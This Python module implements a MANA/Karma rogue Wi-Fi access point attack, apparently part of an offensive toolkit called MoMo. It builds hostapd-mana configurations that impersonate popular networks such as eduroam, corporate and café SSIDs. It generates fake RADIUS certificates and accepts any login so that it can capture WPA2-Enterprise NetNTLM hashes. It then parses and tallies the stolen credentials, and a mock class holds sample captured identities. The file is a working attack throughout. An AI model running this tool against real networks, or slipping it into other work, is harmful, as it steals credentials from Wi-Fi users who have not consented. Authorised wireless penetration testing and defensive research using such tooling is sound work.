"""
MANA Attack - Enhanced Karma with EAP Enterprise support.

MANA (Malicious Access-point Network Attack) improves on Karma:
1. Louder mode - Actively broadcast popular SSIDs
2. EAP support - Capture WPA2-Enterprise credentials
3. Selective response - Target specific clients or SSIDs
4. Better evasion - More realistic AP behavior

hostapd-mana features:
- karma: Respond to all probe requests
- mana_loud: Beacon popular SSIDs without waiting for probes
- mana_wpaout: Log EAP credentials
- mana_credout: Log cleartext credentials

Requires: hostapd-mana (https://github.com/sensepost/hostapd-mana)
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class EAPType(str, Enum):
    """EAP authentication types."""
    PEAP = "peap"           # Protected EAP (most common)
    TTLS = "ttls"           # Tunneled TLS
    TLS = "tls"             # Certificate-based
    LEAP = "leap"           # Lightweight EAP (legacy Cisco)
    FAST = "fast"           # Flexible Auth via Secure Tunneling
    MD5 = "md5"             # EAP-MD5 (weak, rarely used)


@dataclass
class MANAConfig:
    """MANA attack configuration."""
    
    interface: str = "wlan0"
    channel: int = 6
    
    # MANA modes
    karma_enabled: bool = True      # Respond to probe requests
    loud_enabled: bool = True       # Broadcast SSIDs without probes
    eap_enabled: bool = True        # Capture EAP credentials
    
    # Target SSIDs (for loud mode)
    loud_ssids: list[str] = field(default_factory=lambda: [
        "eduroam", "Corporate", "CORP-WiFi", "CompanyNet",
        "Starbucks", "attwifi", "xfinitywifi", "GoogleGuest",
    ])
    
    # EAP configuration
    eap_type: EAPType = EAPType.PEAP
    eap_identity: str = "mana"
    
    # Certificate paths (for EAP)
    cert_dir: Path = field(default_factory=lambda: Path("/opt/momo/certs"))
    
    # Logging
    log_dir: Path = field(default_factory=lambda: Path("logs/mana"))
    wpa_log: Path = field(default_factory=lambda: Path("logs/mana/wpa_credentials.log"))
    cred_log: Path = field(default_factory=lambda: Path("logs/mana/credentials.log"))
    
    # Limits
    max_clients: int = 100
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "interface": self.interface,
            "channel": self.channel,
            "karma_enabled": self.karma_enabled,
            "loud_enabled": self.loud_enabled,
            "eap_enabled": self.eap_enabled,
            "loud_ssids": self.loud_ssids,
            "eap_type": self.eap_type.value,
        }


@dataclass
class EAPCredential:
    """Captured EAP credential."""
    
    identity: str
    password: str = ""
    hash_value: str = ""  # For challenge/response
    
    # Source info
    client_mac: str = ""
    ssid: str = ""
    eap_type: EAPType = EAPType.PEAP
    
    # Metadata
    captured_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    cracked: bool = False
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "identity": self.identity,
            "password": self.password if self.cracked else "[encrypted]",
            "hash_value": self.hash_value[:20] + "..." if len(self.hash_value) > 20 else self.hash_value,
            "client_mac": self.client_mac,
            "ssid": self.ssid,
            "eap_type": self.eap_type.value,
            "captured_at": self.captured_at.isoformat(),
            "cracked": self.cracked,
        }


@dataclass
class MANAStats:
    """MANA attack statistics."""
    
    started_at: datetime | None = None
    uptime_seconds: float = 0.0
    
    # Clients
    clients_connected: int = 0
    clients_total: int = 0
    
    # SSID stats
    ssids_broadcast: int = 0
    probes_received: int = 0
    
    # Credentials
    eap_attempts: int = 0
    eap_captured: int = 0
    eap_cracked: int = 0
    
    # Per-SSID connections
    ssid_hits: dict[str, int] = field(default_factory=dict)
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "started_at": self.started_at.isoformat() if self.started_at else None,
            "uptime_seconds": self.uptime_seconds,
            "clients_connected": self.clients_connected,
            "clients_total": self.clients_total,
            "ssids_broadcast": self.ssids_broadcast,
            "probes_received": self.probes_received,
            "eap_attempts": self.eap_attempts,
            "eap_captured": self.eap_captured,
            "eap_cracked": self.eap_cracked,
            "top_ssids": dict(sorted(
                self.ssid_hits.items(),
                key=lambda x: x[1],
                reverse=True
            )[:10]),
        }


class MANAAttack:
    """
    MANA Attack - Enhanced Karma with EAP credential capture.
    
    MANA extends Karma with:
    - Loud mode: Actively broadcast SSIDs
    - EAP capture: Harvest WPA2-Enterprise credentials
    - Better targeting: Focus on specific clients/networks
    
    Usage:
        mana = MANAAttack(config)
        await mana.start()
        
        # Monitor credentials
        for cred in mana.get_credentials():
            print(f"Captured: {cred.identity}")
        
        await mana.stop()
    """
    
    def __init__(self, config: MANAConfig | None = None):
        self.config = config or MANAConfig()
        
        self._running = False
        self._process: asyncio.subprocess.Process | None = None
        self._dnsmasq_process: asyncio.subprocess.Process | None = None
        
        # State
        self._credentials: list[EAPCredential] = []
        self._clients: dict[str, dict] = {}
        self._stats = MANAStats()
        
        # Config paths
        self._hostapd_conf = Path("/tmp/momo_mana_hostapd.conf")
        self._eap_users = Path("/tmp/momo_mana_eap_users")
    
    @property
    def is_running(self) -> bool:
        return self._running
    
    async def start(self) -> bool:
        """Start MANA attack."""
        if self._running:
            return True
        
        self.config.log_dir.mkdir(parents=True, exist_ok=True)
        
        try:
            # Generate certificates if needed
            if self.config.eap_enabled:
                await self._ensure_certificates()
            
            # Generate configs
            await self._generate_hostapd_mana_conf()
            await self._generate_eap_users()
            
            # Start hostapd-mana
            self._process = await asyncio.create_subprocess_exec(
                "hostapd-mana", str(self._hostapd_conf),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            await asyncio.sleep(2)
            
            if self._process.returncode is not None:
                # Try standard hostapd as fallback
                logger.warning("hostapd-mana not found, trying hostapd")
                self._process = await asyncio.create_subprocess_exec(
                    "hostapd", str(self._hostapd_conf),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                await asyncio.sleep(1)
            
            if self._process.returncode is not None:
                stderr = await self._process.stderr.read() if self._process.stderr else b""
                logger.error("hostapd failed: %s", stderr.decode())
                return False
            
            self._running = True
            self._stats.started_at = datetime.now(UTC)
            self._stats.ssids_broadcast = len(self.config.loud_ssids)
            
            # Start credential monitor
            _ = asyncio.create_task(self._monitor_credentials())
            
            logger.info("MANA attack started - broadcasting %d SSIDs",
                       len(self.config.loud_ssids))
            
            return True
            
        except Exception as e:
            logger.error("MANA start error: %s", e)
            await self.stop()
            return False
    
    async def stop(self) -> None:
        """Stop MANA attack."""
        self._running = False
        
        if self._process and self._process.returncode is None:
            self._process.terminate()
            try:
                await asyncio.wait_for(self._process.wait(), timeout=5.0)
            except TimeoutError:
                self._process.kill()
        
        if self._dnsmasq_process and self._dnsmasq_process.returncode is None:
            self._dnsmasq_process.terminate()
        
        # Cleanup temp files
        for f in [self._hostapd_conf, self._eap_users]:
            try:
                f.unlink(missing_ok=True)
            except Exception:
                pass
        
        logger.info("MANA attack stopped")
    
    async def _ensure_certificates(self) -> None:
        """Ensure EAP certificates exist."""
        self.config.cert_dir.mkdir(parents=True, exist_ok=True)
        
        ca_cert = self.config.cert_dir / "ca.pem"
        server_cert = self.config.cert_dir / "server.pem"
        server_key = self.config.cert_dir / "server.key"
        
        if not all(f.exists() for f in [ca_cert, server_cert, server_key]):
            logger.info("Generating EAP certificates...")
            await self._generate_certificates()
    
    async def _generate_certificates(self) -> None:
        """Generate self-signed certificates for EAP."""
        cert_dir = self.config.cert_dir
        
        # Generate CA key and cert
        ca_key = cert_dir / "ca.key"
        ca_cert = cert_dir / "ca.pem"
        
        # CA key
        proc = await asyncio.create_subprocess_exec(
            "openssl", "genrsa", "-out", str(ca_key), "2048",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        # CA cert
        proc = await asyncio.create_subprocess_exec(
            "openssl", "req", "-new", "-x509",
            "-key", str(ca_key),
            "-out", str(ca_cert),
            "-days", "365",
            "-subj", "/CN=MoMo CA/O=MoMo/C=US",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        # Server key
        server_key = cert_dir / "server.key"
        proc = await asyncio.create_subprocess_exec(
            "openssl", "genrsa", "-out", str(server_key), "2048",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        # Server cert
        server_cert = cert_dir / "server.pem"
        proc = await asyncio.create_subprocess_exec(
            "openssl", "req", "-new",
            "-key", str(server_key),
            "-out", str(cert_dir / "server.csr"),
            "-subj", "/CN=radius.local/O=MoMo/C=US",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        proc = await asyncio.create_subprocess_exec(
            "openssl", "x509", "-req",
            "-in", str(cert_dir / "server.csr"),
            "-CA", str(ca_cert),
            "-CAkey", str(ca_key),
            "-CAcreateserial",
            "-out", str(server_cert),
            "-days", "365",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        # Cleanup CSR
        (cert_dir / "server.csr").unlink(missing_ok=True)
        
        logger.info("Certificates generated in %s", cert_dir)
    
    async def _generate_hostapd_mana_conf(self) -> None:
        """Generate hostapd-mana configuration."""
        
        ssid = self.config.loud_ssids[0] if self.config.loud_ssids else "FreeWiFi"
        
        config = f"""# MoMo MANA Attack Configuration
interface={self.config.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={self.config.channel}

# MANA Karma mode
karma={"1" if self.config.karma_enabled else "0"}

# MANA Loud mode - broadcast these SSIDs
mana_loud={"1" if self.config.loud_enabled else "0"}
"""
        
        # Add loud SSIDs
        if self.config.loud_enabled:
            config += "\n# Loud SSIDs to broadcast\n"
            for ssid in self.config.loud_ssids:
                config += f"mana_ssid={ssid}\n"
        
        # EAP configuration
        if self.config.eap_enabled:
            config += f"""
# EAP Configuration
ieee8021x=1
eap_server=1
eap_user_file={self._eap_users}

# Certificates
ca_cert={self.config.cert_dir}/ca.pem
server_cert={self.config.cert_dir}/server.pem
private_key={self.config.cert_dir}/server.key
private_key_passwd=

# MANA credential logging
mana_wpaout={self.config.wpa_log}
mana_credout={self.config.cred_log}
mana_eapsuccess=1
mana_eaptls=1
"""
        else:
            config += """
# Open network
auth_algs=1
wpa=0
"""
        
        config += f"""
# Limits
max_num_sta={self.config.max_clients}

# Logging
logger_stdout=-1
logger_stdout_level=2
"""
        
        self._hostapd_conf.write_text(config)
    
    async def _generate_eap_users(self) -> None:
        """Generate EAP users file (accepts all credentials)."""
        
        # This accepts any username/password for credential capture
        users = """# Accept all credentials for capture
* PEAP,TTLS,TLS,MSCHAPV2,MD5,GTC
"*" MSCHAPV2 * [2]
"""
        self._eap_users.write_text(users)
    
    async def _monitor_credentials(self) -> None:
        """Monitor credential log files."""
        wpa_log = self.config.wpa_log
        
        while self._running:
            try:
                if wpa_log.exists():
                    content = wpa_log.read_text()
                    self._parse_wpa_log(content)
                
                # Update uptime
                if self._stats.started_at:
                    self._stats.uptime_seconds = (
                        datetime.now(UTC) - self._stats.started_at
                    ).total_seconds()
                    
            except Exception as e:
                logger.debug("Credential monitor error: %s", e)
            
            await asyncio.sleep(5)
    
    def _parse_wpa_log(self, content: str) -> None:
        """Parse MANA WPA credential log."""
        
        # MANA log format varies, but typically:
        # username:$NETNTLM$challenge$response
        
        for line in content.splitlines():
            if not line.strip():
                continue
            
            # Already parsed?
            if any(c.hash_value and c.hash_value in line for c in self._credentials):
                continue
            
            # Try to parse
            if ":" in line:
                parts = line.split(":", 1)
                identity = parts[0]
                hash_value = parts[1] if len(parts) > 1 else ""
                
                cred = EAPCredential(
                    identity=identity,
                    hash_value=hash_value,
                    eap_type=self.config.eap_type,
                )
                
                self._credentials.append(cred)
                self._stats.eap_captured += 1
                
                logger.info("Captured EAP credential: %s", identity)
    
    def add_loud_ssid(self, ssid: str) -> None:
        """Add SSID to loud broadcast list."""
        if ssid not in self.config.loud_ssids:
            self.config.loud_ssids.append(ssid)
            self._stats.ssids_broadcast = len(self.config.loud_ssids)
    
    def get_credentials(self) -> list[EAPCredential]:
        """Get captured credentials."""
        return self._credentials.copy()
    
    def get_stats(self) -> dict[str, Any]:
        """Get attack statistics."""
        return self._stats.to_dict()
    
    def get_metrics(self) -> dict[str, Any]:
        """Get Prometheus-compatible metrics."""
        return {
            "momo_mana_clients_connected": self._stats.clients_connected,
            "momo_mana_ssids_broadcast": self._stats.ssids_broadcast,
            "momo_mana_eap_attempts": self._stats.eap_attempts,
            "momo_mana_eap_captured": self._stats.eap_captured,
            "momo_mana_eap_cracked": self._stats.eap_cracked,
        }


class MockMANAAttack(MANAAttack):
    """Mock MANA attack for testing."""
    
    async def start(self) -> bool:
        """Mock start."""
        self._running = True
        self._stats.started_at = datetime.now(UTC)
        self._stats.ssids_broadcast = len(self.config.loud_ssids)
        
        # Add mock credentials
        self._credentials = [
            EAPCredential(
                identity="john.doe@company.com",
                hash_value="$NETNTLM$abc123...",
                ssid="CORP-WiFi",
                client_mac="AA:BB:CC:DD:EE:01",
            ),
            EAPCredential(
                identity="jane.smith",
                hash_value="$NETNTLM$def456...",
                ssid="eduroam",
                client_mac="AA:BB:CC:DD:EE:02",
            ),
        ]
        self._stats.eap_captured = 2
        self._stats.clients_connected = 3
        
        logger.info("MockMANAAttack started")
        return True
    
    async def stop(self) -> None:
        """Mock stop."""
        self._running = False
        logger.info("MockMANAAttack stopped")

